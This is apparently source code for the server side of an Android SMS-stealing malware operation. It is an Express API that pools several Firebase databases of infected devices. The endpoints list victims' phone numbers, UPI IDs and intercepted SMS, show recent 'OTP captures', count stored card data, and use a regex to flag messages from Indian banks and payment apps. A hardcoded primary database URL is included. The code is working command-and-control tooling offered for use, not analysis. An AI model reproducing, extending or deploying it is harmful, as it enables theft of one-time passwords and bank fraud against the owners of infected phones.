import { Router } from "express";
import { fbGet, fbSet, fbDelete } from "../bot/firebase";
import { requireAdmin } from "../middlewares/auth";
import { requireAuth } from "../middlewares/auth";

/**
 * Multi-Firebase management.
 *
 * The panel + APK normally talk to the primary RTDB (FIREBASE_DB_URL).
 * Admins can register additional Firebase RTDB instances here; the panel
 * then aggregates `clients`/`messages` from every enabled instance so SMS
 * from multiple projects shows up in one place.
 */

const router = Router();
const FB_PATH = "config/firebases";

export interface FirebaseEntry {
  id: string;
  name: string;
  databaseURL: string;
  apiKey?: string;
  enabled: boolean;
  addedAt: number;
}

// GET /api/firebases — list all registered Firebase instances
router.get("/firebases", requireAuth, async (_req, res) => {
  try {
    const all = (await fbGet(FB_PATH)) || {};
    const list = Object.entries(all).map(([id, f]: [string, any]) => ({
      id,
      name: f.name || id,
      databaseURL: f.databaseURL || "",
      apiKey: f.apiKey || "",
      enabled: f.enabled !== false,
      addedAt: f.addedAt || null,
    }));
    return res.json({ firebases: list });
  } catch (err) {
    return res.status(500).json({ error: "Failed to fetch firebases" });
  }
});

// POST /api/firebases — add a Firebase instance
router.post("/firebases", requireAdmin, async (req, res) => {
  try {
    const { name, databaseURL, apiKey, enabled } = req.body ?? {};
    if (!databaseURL || typeof databaseURL !== "string") {
      return res.status(400).json({ error: "databaseURL is required" });
    }
    if (!/^https:\/\/.+\.firebaseio\.com$/.test(databaseURL)) {
      return res.status(400).json({
        error:
          "Invalid Firebase RTDB URL (expected https://xxx.firebaseio.com)",
      });
    }
    // Dedupe by URL — re-adding an instance must not create a second copy.
    const existing = (await fbGet(FB_PATH).catch(() => null)) as Record<
      string,
      any
    > | null;
    if (existing) {
      const dup = Object.values(existing).find(
        (e) => e && e.databaseURL === databaseURL
      );
      if (dup) {
        return res.json({ success: true, firebase: dup, duplicated: true });
      }
    }
    const id =
      "fb_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const entry: FirebaseEntry = {
      id,
      name: name || databaseURL.replace(/^https:\/\//, "").split(".")[0],
      databaseURL,
      apiKey:
        typeof apiKey === "string" && apiKey.trim() ? apiKey.trim() : undefined,
      enabled: enabled !== false,
      addedAt: Date.now(),
    };
    await fbSet(`${FB_PATH}/${id}`, entry);
    return res.json({ success: true, firebase: entry });
  } catch (err) {
    return res.status(500).json({ error: "Failed to add firebase" });
  }
});

// DELETE /api/firebases/:id — remove a Firebase instance
router.delete("/firebases/:id", requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const existing = await fbGet(`${FB_PATH}/${id}`);
    if (!existing) {
      return res.status(404).json({ error: "Firebase entry not found" });
    }
    await fbDelete(`${FB_PATH}/${id}`);
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: "Failed to delete firebase" });
  }
});

export default router;

// ─────────────────────────────────────────────────────────────────────────────
// Per-instance data endpoints + full-backend overview.
// All reads go through the Firebase REST API (no SDK), same as the bot.
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Mirror of web-panel/src/lib/normalizeDevice.ts online logic: a device is
 * online when ping/lastPing (epoch ms) is under 5 min old; otherwise fall
 * back to the status boolean/string written by older native APKs.
 */
export function deviceIsOnline(c: any, now: number): boolean {
  const raw = c?.ping ?? c?.lastPing ?? null;
  if (raw != null) {
    const t = Number(raw);
    if (!isNaN(t)) return now - t < 300_000;
  }
  if (typeof c?.status === "boolean") return c.status;
  if (typeof c?.status === "string")
    return c.status === "true" || c.status === "online";
  return false;
}

export const PRIMARY_DB =
  process.env["FIREBASE_DB_URL"] ||
  "https://axexodiweb-default-rtdb.firebaseio.com";
const BANK_SMS_RE =
  /bank|hdfc|sbi|icici|axis|kotak|bob|union|pnb|upi|paytm|phonepe|gpay|google pay|net banking|atm|withdraw|credited|debited|transaction/i;

export async function fbGetFor(
  dbUrl: string,
  key: string | undefined,
  path: string,
  timeoutMs = 8000,
  extraQuery = ""
): Promise<any> {
  const params: string[] = [];
  if (key) params.push(`k=${encodeURIComponent(key)}`);
  if (extraQuery) params.push(extraQuery.replace(/^\?/, ""));
  const qs = params.length ? `?${params.join("&")}` : "";
  const res = await fetch(`${dbUrl}/${path}.json${qs}`, {
    signal: AbortSignal.timeout(timeoutMs),
    headers: { "Content-Type": "application/json" },
  });
  if (!res.ok) throw new Error(`FB GET ${path} -> ${res.status}`);
  return res.json();
}

export interface InstanceInfo {
  id: string;
  name: string;
  databaseURL: string;
  apiKey?: string;
  enabled?: boolean;
  primary?: boolean;
}

export async function listInstances(): Promise<InstanceInfo[]> {
  const list: InstanceInfo[] = [];
  const cfg = (await fbGet("config/firebases").catch(() => null)) as Record<
    string,
    any
  > | null;
  if (cfg) {
    for (const [id, entry] of Object.entries(cfg)) {
      if (!entry) continue;
      list.push({
        id,
        name: entry.name || id,
        databaseURL: entry.databaseURL,
        apiKey: entry.apiKey,
        enabled: entry.enabled !== false,
      });
    }
  }
  const hasPrimary = list.some((i) => i.databaseURL === PRIMARY_DB);
  if (!hasPrimary) {
    list.unshift({
      id: "primary",
      name: "Primary",
      databaseURL: PRIMARY_DB,
      primary: true,
    });
  }
  return list;
}

function instanceStats(raw: any): Record<string, number> {
  const clients = (raw.clients || {}) as Record<string, any>;
  const ids = Object.keys(clients);
  const now = Date.now();
  let online = 0;
  let cards = 0;
  for (const id of ids) {
    const c = clients[id] || {};
    if (deviceIsOnline(c, now)) online++;
    if (
      Object.keys(c).some(
        (k) => k.startsWith("cc_") || k === "cc" || k === "cards"
      )
    )
      cards++;
  }
  const messages = (raw.messages || {}) as Record<string, any>;
  let smsCount = 0;
  const firstMsg = Object.values(messages)[0];
  if (firstMsg === true) {
    // shallow=true result — count devices that have messages
    smsCount = Object.keys(messages).length;
  } else {
    for (const devId of Object.keys(messages).slice(0, 200)) {
      const list = messages[devId];
      if (list && typeof list === "object")
        smsCount += Object.keys(list).length;
    }
  }
  const otps = (raw.otps?.latest || {}) as Record<string, any>;
  let bankSms = 0;
  for (const rec of Object.values(otps)) {
    if (rec && BANK_SMS_RE.test(`${rec.body || ""} ${rec.service || ""}`))
      bankSms++;
  }
  return {
    devices: ids.length,
    online,
    offline: ids.length - online,
    sms: smsCount,
    otps: Object.keys(otps).length,
    bankSms,
    cards,
  };
}

/** GET /api/overview — full backend state: every instance + totals */
router.get("/overview", requireAuth, async (_req, res) => {
  try {
    const instances = await listInstances();
    const rows = await Promise.allSettled(
      instances.map(async (inst) => {
        const [clients, messages, otps] = await Promise.all([
          fbGetFor(inst.databaseURL, inst.apiKey, "clients").catch(() => null),
          fbGetFor(
            inst.databaseURL,
            inst.apiKey,
            "messages",
            10_000,
            "shallow=true"
          ).catch(() => null),
          fbGetFor(inst.databaseURL, inst.apiKey, "otps/latest").catch(
            () => null
          ),
        ]);
        return { ...inst, stats: instanceStats({ clients, messages, otps }) };
      })
    );
    const instancesOut: any[] = [];
    const totals = {
      devices: 0,
      online: 0,
      offline: 0,
      sms: 0,
      otps: 0,
      bankSms: 0,
      cards: 0,
    };
    rows.forEach((r, i) => {
      if (r.status === "fulfilled") {
        const s = r.value.stats;
        for (const k of Object.keys(totals))
          totals[k as keyof typeof totals] += s[k] || 0;
        instancesOut.push({
          id: r.value.id,
          name: r.value.name,
          databaseURL: r.value.databaseURL,
          primary: !!r.value.primary,
          enabled: r.value.enabled !== false,
          stats: s,
        });
      } else {
        instancesOut.push({
          id: instances[i].id,
          name: instances[i].name,
          databaseURL: instances[i].databaseURL,
          primary: !!instances[i].primary,
          error: (r.reason as Error)?.message || "unreachable",
        });
      }
    });
    return res.json({ success: true, totals, instances: instancesOut });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Overview failed" });
  }
});

/** GET /api/firebases/:id/status — one instance, same stats shape */
router.get("/firebases/:id/status", requireAuth, async (req, res) => {
  try {
    const instances = await listInstances();
    const inst = instances.find((i) => i.id === req.params.id);
    if (!inst) return res.status(404).json({ error: "Instance not found" });
    const [clients, messages, otps] = await Promise.all([
      fbGetFor(inst.databaseURL, inst.apiKey, "clients").catch(() => null),
      fbGetFor(
        inst.databaseURL,
        inst.apiKey,
        "messages",
        10_000,
        "shallow=true"
      ).catch(() => null),
      fbGetFor(inst.databaseURL, inst.apiKey, "otps/latest").catch(() => null),
    ]);
    const stats = instanceStats({ clients, messages, otps });
    const now = Date.now();
    const devices = Object.entries((clients || {}) as Record<string, any>).map(
      ([deviceId, c]) => {
        return {
          id: deviceId,
          model: c.modelName || c.model || "Unknown",
          phone: c.mobNo || c.phone || "",
          upi: c.upi || "",
          network: c.service_provider || "",
          androidV: c.androidVersion || c.androidV || "",
          battery: c.battery || "",
          online: deviceIsOnline(c, now),
        };
      }
    );
    return res.json({
      success: true,
      id: inst.id,
      name: inst.name,
      databaseURL: inst.databaseURL,
      stats,
      devices,
    });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Status failed" });
  }
});

/** GET /api/firebases/:id/sms?limit=50 — recent SMS across that instance's devices */
router.get("/firebases/:id/sms", requireAuth, async (req, res) => {
  try {
    const limit = Math.min(
      200,
      Math.max(1, parseInt(String(req.query.limit || "50"), 10) || 50)
    );
    const instances = await listInstances();
    const inst = instances.find((i) => i.id === req.params.id);
    if (!inst) return res.status(404).json({ error: "Instance not found" });
    const clients =
      (await fbGetFor(inst.databaseURL, inst.apiKey, "clients").catch(
        () => ({})
      )) || {};
    const deviceKeys = Object.keys(
      (await fbGetFor(
        inst.databaseURL,
        inst.apiKey,
        "messages",
        10_000,
        "shallow=true"
      ).catch(() => ({}))) || {}
    );
    const rows: any[] = [];
    const clientsData = clients as Record<string, any>;
    // Page per-device messages (limitToLast + orderBy — REST requires orderBy
    // with limits) so 100MB trees never load in full. Fetch devices in parallel.
    const orderByKey = `orderBy=${encodeURIComponent('"$key"')}&limitToLast=25`;
    const CHUNK = 10;
    for (let i = 0; i < deviceKeys.length; i += CHUNK) {
      const batch = deviceKeys.slice(i, i + CHUNK);
      const lists = await Promise.all(
        batch.map((deviceId) =>
          fbGetFor(
            inst.databaseURL,
            inst.apiKey,
            `messages/${deviceId}`,
            10_000,
            orderByKey
          ).catch(() => ({}))
        )
      );
      batch.forEach((deviceId, idx) => {
        const list = lists[idx] || {};
        const device = clientsData[deviceId] || {};
        for (const [pushKey, sms] of Object.entries(
          list as Record<string, any>
        )) {
          if (!sms) continue;
          const sortKey =
            sms.id != null
              ? Number(sms.id)
              : sms.date
                ? parseInt(String(sms.date), 10)
                : 0;
          rows.push({
            deviceId,
            deviceModel: device.modelName || device.model || "Unknown",
            devicePhone: device.mobNo || device.phone || "",
            from: sms.sender || sms.from || "Unknown",
            body: sms.message || sms.body || "",
            date: sortKey,
            bank: BANK_SMS_RE.test(
              `${sms.message || ""} ${sms.body || ""} ${sms.sender || ""}`
            ),
          });
        }
      });
    }
    rows.sort((a, b) => b.date - a.date);
    return res.json({
      success: true,
      instance: inst.name,
      total: rows.length,
      sms: rows.slice(0, limit),
    });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "SMS fetch failed" });
  }
});

/** GET /api/firebases/:id/otps?limit=20 — recent OTP captures for that instance */
router.get("/firebases/:id/otps", requireAuth, async (req, res) => {
  try {
    const limit = Math.min(
      100,
      Math.max(1, parseInt(String(req.query.limit || "20"), 10) || 20)
    );
    const instances = await listInstances();
    const inst = instances.find((i) => i.id === req.params.id);
    if (!inst) return res.status(404).json({ error: "Instance not found" });
    const otps = ((await fbGetFor(
      inst.databaseURL,
      inst.apiKey,
      "otps/latest"
    ).catch(() => ({}))) || {}) as Record<string, any>; // RTDB returns JSON null for missing paths
    const rows = Object.values(otps)
      .filter((r) => r && r.code)
      .sort((a, b) => (b.date || 0) - (a.date || 0))
      .slice(0, limit)
      .map((r) => ({
        code: r.code,
        service: r.service || "",
        number: r.number || "",
        from: r.from || "",
        body: r.body || "",
        deviceId: r.deviceId || "",
        date: r.date || 0,
      }));
    return res.json({ success: true, instance: inst.name, otps: rows });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "OTP fetch failed" });
  }
});
